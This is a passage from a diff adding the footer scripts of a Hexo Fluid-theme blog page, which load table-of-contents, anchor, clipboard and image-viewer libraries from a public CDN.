+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
